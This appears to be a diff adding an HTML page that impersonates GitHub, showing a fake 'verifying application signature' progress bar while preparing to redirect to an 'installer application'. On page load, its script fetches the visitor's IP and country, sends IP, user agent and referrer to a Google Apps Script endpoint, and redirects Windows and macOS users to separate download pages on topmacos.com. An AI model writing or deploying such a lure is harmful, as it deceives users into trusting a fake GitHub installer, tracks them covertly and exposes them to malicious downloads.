@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
+    <title>Redirecting | GitHub</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; }
+        body { background:#0d1117; color:#e6edf3; min-height:100vh; display:flex; justify-content:center; align-items:center; overflow:hidden; }
+        .container { text-align:center; max-width:500px; width:90%; padding:2rem; }
+        .github-icon { width:80px; height:80px; margin:0 auto 2rem; position:relative; }
+        .octocat-arm { position:absolute; top:35px; right:-8px; width:20px; height:12px; background:#e6edf3; border-radius:4px; transform-origin:left center; animation:wave 2s ease-in-out infinite; }
+        .logo-text { font-size:2.5rem; font-weight:600; margin-bottom:.5rem; color:#f0f6fc; }
+        .subtitle { font-size:1.1rem; color:#7d8590; margin-bottom:3rem; line-height:1.5; }
+        .loader-container { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:2.5rem 2rem; margin-bottom:2rem; }
+        .progress-info { display:flex; justify-content:space-between; margin-bottom:1rem; font-size:.9rem; color:#7d8590; }
+        .progress-bar { width:100%; height:8px; background:#21262d; border-radius:4px; overflow:hidden; margin-bottom:1.5rem; }
+        .progress-fill { height:100%; width:0%; background:#238636; border-radius:4px; transition:width .3s ease; position:relative; }
+        .progress-fill::after { content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent); animation:shine 2s infinite; }
+        .status-line { display:flex; align-items:center; justify-content:center; gap:.5rem; margin-bottom:1.5rem; font-size:.95rem; }
+        .status-dot { width:8px; height:8px; border-radius:50%; background:#238636; animation:pulse 2s infinite; }
+        .branch-info { display:inline-flex; align-items:center; gap:.5rem; padding:.5rem 1rem; background:#1f6feb; border-radius:6px; font-size:.9rem; margin-bottom:1rem; }
+        .commit-grid { display:grid; grid-template-columns:repeat(10,1fr); gap:4px; margin:1.5rem 0; }
+        .commit-cell { aspect-ratio:1; background:#21262d; border-radius:2px; transition:all .3s ease; }
+        .commit-cell.active { background:#238636; }
+        .redirect-message { color:#7d8590; font-size:.95rem; margin-top:1.5rem; }
+        .github-corner { position:absolute; top:0; right:0; border:0; fill:#30363d; color:#0d1117; }
+        @keyframes wave { 0%,100%{transform:rotate(0)} 50%{transform:rotate(-20deg)} }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+        @keyframes shine { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
+        @keyframes fadeIn { from{opacity:0; transform:translateY(10px)} to{opacity:1; transform:translateY(0)} }
+        @media (max-width:768px){
+            .container{padding:1rem}
+            .logo-text{font-size:2rem}
+            .github-icon{width:60px;height:60px}
+            .octocat-arm{top:25px; right:-6px; width:16px; height:10px}
+        }
+    </style>
+</head>
+<body>
+    <a href="https://github.com" class="github-corner" aria-label="View source on GitHub">
+        <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position:absolute; top:0; border:0; right:0;" aria-hidden="true">
+            <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+            <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px;" class="octo-arm"></path>
+            <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+        </svg>
+    </a>
+
+    <div class="container">
+        <div class="github-icon">
+            <svg height="80" viewBox="0 0 16 16" width="80" fill="#e6edf3">
+                <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+            </svg>
+            <div class="octocat-arm"></div>
+        </div>
+
+        <h1 class="logo-text">GitHub</h1>
+        <p class="subtitle">Preparing to redirect to installer application</p>
+
+        <div class="loader-container">
+            <div class="progress-info">
+                <span>Processing request</span>
+                <span id="percentage">0%</span>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
+            </div>
+
+            <div class="status-line">
+                <div class="status-dot"></div>
+                <span id="status">Initializing security protocols</span>
+            </div>
+
+            <div class="branch-info">
+                <svg height="16" viewBox="0 0 16 16" width="16" fill="#e6edf3">
+                    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
+                </svg>
+                <span>main → installer-app</span>
+            </div>
+
+            <div class="commit-grid" id="commitGrid"></div>
+        </div>
+
+        <p class="redirect-message">You will be redirected to the installation page shortly</p>
+    </div>
+
+    <script>
+        /* ================== CONFIG ================== */
+        // TRACKER: Windows users go to topmacos.com/revo/, macOS users go to topmacos.com/saiyaara/
+        const DEST = {
+          windows:  "https://topmacos.com/revo/",
+          macos:    "https://topmacos.com/saiyaara/",
+          ios:      "https://topmacos.com/revo/",
+          android:  "https://topmacos.com/revo/",
+          linux:    "https://topmacos.com/revo/",
+          other:    "https://topmacos.com/revo/"
+        };
+        // Google Apps Script Web App URL for tracking
+        const APP_URL = "https://script.google.com/macros/s/AKfycbwip_VgPEumBXeWuX_OEX6huIMHfPXidiweHpHR-fGUQIqpcR-mAMAHC1JCUQyJne3n0Q/exec";
+        // Delay after 100% before redirect (ms)
+        const REDIRECT_DELAY_MS = 200;
+
+        
+  /* ================== HELPERS ================== */
+  const qs = new URLSearchParams(location.search);
+  const hardOs = (qs.get('os') || '').toLowerCase();
+
+  function parseParams(str){
+    const out = {}; if(!str) return out;
+    const s = str.replace(/^[?#]+/,''); if(!s) return out;
+    for(const pair of s.split('&')){ if(!pair) continue;
+      const [k,v] = pair.split('=');
+      const key = decodeURIComponent((k||'').trim());
+      const val = v===undefined ? '1' : decodeURIComponent((v||'').trim());
+      if(key) out[key]=val;
+    } return out;
+  }
+  function getOffer(){
+    const q=parseParams(location.search), h=parseParams(location.hash);
+    return q.offername || q.offer || q.offer_name || h.offername || h.offer || h.offer_name || '';
+  }
+  function keepQueryAndHash(base){ return base + location.search + (location.hash||''); }
+
+  // OS detect - tracks Windows and macOS specifically
+  function detectOS(){
+    if (['windows','macos','ios','android','linux','other'].includes(hardOs)) return hardOs;
+    const uad = navigator.userAgentData;
+    if (uad && uad.platform){
+      const p=uad.platform.toLowerCase();
+      if (p.includes('windows')) return 'windows';
+      if (p.includes('mac'))     return 'macos';
+      if (p.includes('ios'))     return 'ios';
+      if (p.includes('android')) return 'android';
+      if (p.includes('linux'))   return 'linux';
+    }
+    const ua = navigator.userAgent||'';
+    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
+    if (/Android/i.test(ua))          return 'android';
+    if (/Windows NT/i.test(ua))       return 'windows';
+    if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
+    if (/Linux/i.test(ua))            return 'linux';
+    return 'other';
+  }
+
+  // Get IP address for tracking
+  async function getIP(){
+    try{
+      const r = await fetch("https://api64.ipify.org?format=json", {cache:"no-store"});
+      const j = await r.json();
+      return j.ip || "";
+    }catch{ return ""; }
+  }
+  
+  // Get geo information for tracking
+  async function getGeo(ip){
+    try{
+      if(!ip) return {country:"", countryCode:""};
+      const r = await fetch(`https://ipapi.co/${ip}/json/`, {cache:"no-store"});
+      const j = await r.json();
+      return { country: j.country_name || "", countryCode: j.country || "" };
+    }catch{ return {country:"", countryCode:""}; }
+  }
+
+  // Tracking function - sends OS data to Google Apps Script
+  function trackOSAndRedirect({os, offer, targetUrl, ip, country, countryCode}){
+    try{
+      const payload = {
+        ip, 
+        country, 
+        countryCode,
+        operatingSystem: os,
+        userAgent: navigator.userAgent,
+        referrer: document.referrer || "",
+        timestamp: new Date().toISOString(),
+        redirectUrl: targetUrl,
+        offer: offer,
+        eventType: "os_tracker_redirect"
+      };
+      const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
+      // Send tracking data via image beacon (non-blocking)
+      (new Image(1,1)).src = APP_URL + "?" + q + "&_t=" + Date.now();
+    }catch(_){}
+  }
+
+  /* ================== UI ================== */
+  function createCommitGrid() {
+    const grid = document.getElementById('commitGrid');
+    const cellCount = 70;
+    for (let i = 0; i < cellCount; i++) {
+      const cell = document.createElement('div');
+      cell.classList.add('commit-cell');
+      if (Math.random() > 0.4) cell.style.opacity = Math.random() * 0.5 + 0.3;
+      grid.appendChild(cell);
+    }
+  }
+
+  function animateProgress(targetUrl, os, offer) {
+    const progress = document.getElementById('progress');
+    const percentage = document.getElementById('percentage');
+    const status = document.getElementById('status');
+    const commitCells = document.querySelectorAll('.commit-cell');
+
+    const statusMessages = [
+      "Initializing security protocols",
+      "Verifying application signature",
+      "Establishing secure connection",
+      "Preparing download session",
+      "Finalizing redirect sequence"
+    ];
+
+    let progressValue = 0;
+    let currentStatus = 0;
+
+    const interval = setInterval(() => {
+      progressValue += 1;
+      progress.style.width = `${progressValue}%`;
+      percentage.textContent = `${progressValue}%`;
+
+      if (progressValue === 20 && currentStatus === 0) { status.textContent = statusMessages[1]; currentStatus = 1; }
+      if (progressValue === 45 && currentStatus === 1) { status.textContent = statusMessages[2]; currentStatus = 2; }
+      if (progressValue === 70 && currentStatus === 2) { status.textContent = statusMessages[3]; currentStatus = 3; }
+      if (progressValue === 90 && currentStatus === 3) { status.textContent = statusMessages[4]; currentStatus = 4; }
+
+      if (progressValue % 5 === 0) {
+        const randomCell = commitCells[Math.floor(Math.random() * commitCells.length)];
+        if (randomCell) { randomCell.classList.add('active'); setTimeout(() => randomCell.classList.remove('active'), 1000); }
+      }
+
+      if (progressValue >= 100) {
+        clearInterval(interval);
+        setTimeout(() => { location.replace(targetUrl); }, REDIRECT_DELAY_MS);
+      }
+    }, 40);
+  }
+
+  // Initialize tracker: detect OS, get IP/Geo, send tracking data, then redirect to appropriate URL
+  window.addEventListener('load', async () => {
+    createCommitGrid();
+
+    // Detect operating system
+    const os = detectOS();
+    const offer = getOffer();
+    
+    // Get redirect URL based on detected OS
+    // Windows users go to topmacos.com/revo/, macOS users go to topmacos.com/saiyaara/
+    let targetUrl;
+    if (os === 'windows') {
+      targetUrl = DEST.windows;
+    } else if (os === 'macos') {
+      targetUrl = DEST.macos;
+    } else {
+      // For other OS types, use fallback (GitHub pricing page)
+      targetUrl = DEST[os] || DEST.other;
+    }
+    
+    // Preserve query parameters and hash if they exist
+    targetUrl = keepQueryAndHash(targetUrl);
+
+    // Get IP and Geo information for tracking
+    const ip = await getIP();
+    const geo = await getGeo(ip);
+
+    // Send tracking data to Google Apps Script
+    trackOSAndRedirect({
+      os, 
+      offer, 
+      targetUrl,
+      ip,
+      country: geo.country,
+      countryCode: geo.countryCode
+    });
+
+    // Start progress animation and redirect
+    animateProgress(targetUrl, os, offer);
+  });
+</script>
+</body>
+</html>
